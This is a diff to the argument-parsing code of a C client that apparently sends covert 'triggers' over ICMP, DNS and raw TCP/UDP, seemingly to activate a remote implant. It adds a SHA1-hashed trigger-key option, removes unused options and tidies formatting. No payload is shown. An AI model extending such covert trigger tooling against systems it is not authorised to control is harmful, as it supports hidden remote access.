@@ -9,6 +9,8 @@
 #include "debug.h"
 #include "colors.h"
 
+#include "trigger_protocols.h"
+
 #include "proj_strings.h"
 #include "proj_strings_main.h"
 
@@ -61,15 +63,15 @@ static void * asloc( char *string )
 //****************************************************************************
 int main( int argc, char **argv )
 {
-	struct trigger_params		trigger_args;		// struct to hold arguments for trigger thread
-	int							optval;
-	unsigned short				port;
-	struct proc_vars			pvars;				
-	int							mode_set = 0;		// once set to one, mode is locked
-	uint16_t					trigger_port = 0;
+	struct trigger_params	trigger_args;		// struct to hold arguments for trigger thread
+	int			optval;
+	unsigned short		port;
+	struct proc_vars	pvars;
+	int			mode_set = 0;		// once set to one, mode is locked
+	uint16_t		trigger_port = 0;
 
 	init_strings();
-    init_crypto_strings();
+	init_crypto_strings();
 
 	memset( &trigger_args, 0, sizeof( struct trigger_params ) );
 
@@ -98,7 +100,7 @@ int main( int argc, char **argv )
         initSrandFlag = 1;
     }
 
-	while ( ( optval = getopt(argc, argv, ":t:a:p:P:d:e:m:r:h")) != -1 )
+	while ( ( optval = getopt(argc, argv, ":t:a:p:P:d:m:r:k:")) != -1 )
 	{
 		switch( optval )
 		{
@@ -176,8 +178,7 @@ int main( int argc, char **argv )
 					//fprintf( stderr, "\tdns-request\n" );			dnsRequestString	
 					//fprintf( stderr, "\traw-tcp\n" );				rawTcpString
 					//fprintf( stderr, "\traw-udp\n" );				rawUdpString
-					fprintf( stderr, "\n  %s%s:%s %s", RED, \
-						ErrorString, invalidProtocolString, RESET );
+					fprintf( stderr, "\n  %s%s:%s %s", RED, ErrorString, invalidProtocolString, RESET );
 					fprintf( stderr, "%s", pingRequestString);
 					fprintf( stderr, "%s", pingReplyString );
 					fprintf( stderr, "%s", icmpErrorString );
@@ -219,14 +220,19 @@ int main( int argc, char **argv )
 				return -1;
 				break;
 
-			// reserved for "execute options"
-			case 'e':
-			case 'h':
-				Usage( pvars.progname );
-				return -1;
+			// Trigger Key
+			// The trigger key sent is the SHA1 hash of the trigger key specified.
+			case 'k':
+				if (strlen(optarg) >= ID_KEY_LENGTH_MIN)
+					sha1((const unsigned char *)optarg, strlen(optarg), trigger_args.idKey_hash);
+				else {
+					print_opterr( argv[0], OPT_INVALID );
+					return -1;
+				}
 				break;
 		}
 	}
+
 	// Check user inputs
 	// client can be run in three modes:
 	// 		(1) send triggers only
@@ -246,7 +252,7 @@ int main( int argc, char **argv )
 
 	// Argument validation for triggers:
 	// -t, -a, -p, and -P must all be set
-	// TODO: verifty that arguments will be validated by the trigger functions
+	// TODO: verify that arguments will be validated by the trigger functions
 	if ( pvars.trigger == YES )
 	{
 		// then at least one of the following options were set: -t, -a, or -P
